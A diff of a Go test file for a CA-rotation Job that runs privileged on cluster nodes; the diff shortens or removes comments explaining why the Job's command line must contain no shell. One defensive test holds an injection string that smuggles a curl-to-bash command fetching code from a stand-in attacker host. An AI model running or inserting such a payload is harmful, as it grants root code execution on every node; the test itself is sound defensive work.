@@ -9,15 +9,7 @@ import (
 	"github.com/ctrliq/stratum/internal/version"
 )
 
-// TestCANodeArgvHasNoShell is the structural guarantee that no
-// interpreter is present anywhere in the CA-rotation payload, so nothing in it
-// can be re-parsed as code on the node. This Job is privileged, HostPID and
-// nsenters PID 1, so a shell here is root on every node in the cluster — the
-// same shell-free shape the node-upgrade Job's argv already has.
-//
-// A regression here re-opens that channel even though no caller passes an
-// attacker-influenced phase today, which is precisely the point: the guarantee
-// must not depend on the call sites staying benign.
+// the Job is privileged and nsenters PID 1, so a shell here is root on every node.
 func TestCANodeArgvHasNoShell(t *testing.T) {
 	for _, phase := range []string{PhaseTrustNew, PhaseSignNew, PhaseFinalize} {
 		for _, fetchShared := range []bool{false, true} {
@@ -39,10 +31,7 @@ func TestCANodeArgvHasNoShell(t *testing.T) {
 	}
 }
 
-// Hostile values must land as ONE argv element and never be split, concatenated
-// or interpreted. Nothing routes an untrusted phase here today; this asserts the
-// payload layer is safe on its own, so it does not silently become the only
-// control if a future caller does.
+// the payload layer must be safe on its own, not depend on call sites staying benign.
 func TestCANodeArgvKeepsHostileValuesAsSingleElements(t *testing.T) {
 	const evil = "finalize; curl http://attacker/x | bash"
 	argv := caNodeArgv(evil, false, false)
@@ -66,9 +55,6 @@ func TestCANodeArgvKeepsHostileValuesAsSingleElements(t *testing.T) {
 	}
 }
 
-// The flags the orchestrator depends on must actually be present: --yes because
-// rotate-ca refuses without it, and --fetch-shared only on the follower
-// trust-new leg that needs the initiator's staged material.
 func TestCANodeArgvCarriesTheRequiredFlags(t *testing.T) {
 	has := func(argv []string, flag string) bool {
 		for _, a := range argv {
@@ -104,9 +90,7 @@ func TestCANodeArgvCarriesTheRequiredFlags(t *testing.T) {
 	}
 }
 
-// The Job execs the stratum installed on the node. BinDir holds the payload's
-// binaries and never stratum, so a Job that ran BinDir/stratum failed on every
-// node but the initiator, and a rollback stopped halfway.
+// BinDir holds the payload's binaries and never stratum.
 func TestCANodeArgvExecsTheInstalledStratum(t *testing.T) {
 	argv := caNodeArgv(PhaseTrustNew, false, false)
 	i := slices.Index(argv, "--")
@@ -121,11 +105,6 @@ func TestCANodeArgvExecsTheInstalledStratum(t *testing.T) {
 	}
 }
 
-// Finalize on a node is not gated on mounted tokens again: the orchestrator
-// checked every node before the first finalized, and a refusal here would halt
-// the rotation after the old key was already dropped elsewhere. No other phase
-// takes the flag, and the operator's --skip-token-check (which needs --force)
-// is never what the Job passes.
 func TestCANodeArgvMarksTokensCheckedOnlyInFinalize(t *testing.T) {
 	for _, phase := range []string{PhaseTrustNew, PhaseSignNew, PhaseFinalize} {
 		argv := caNodeArgv(phase, false, false)
@@ -138,9 +117,6 @@ func TestCANodeArgvMarksTokensCheckedOnlyInFinalize(t *testing.T) {
 	}
 }
 
-// TestTrustNewOthersPassesForceToControlPlanesOnly: the other control planes
-// fetch the staged material and take the run's --force, so one that lost the
-// same key goes ahead; a worker takes neither.
 func TestTrustNewOthersPassesForceToControlPlanesOnly(t *testing.T) {
 	for _, force := range []bool{false, true} {
 		var got []string
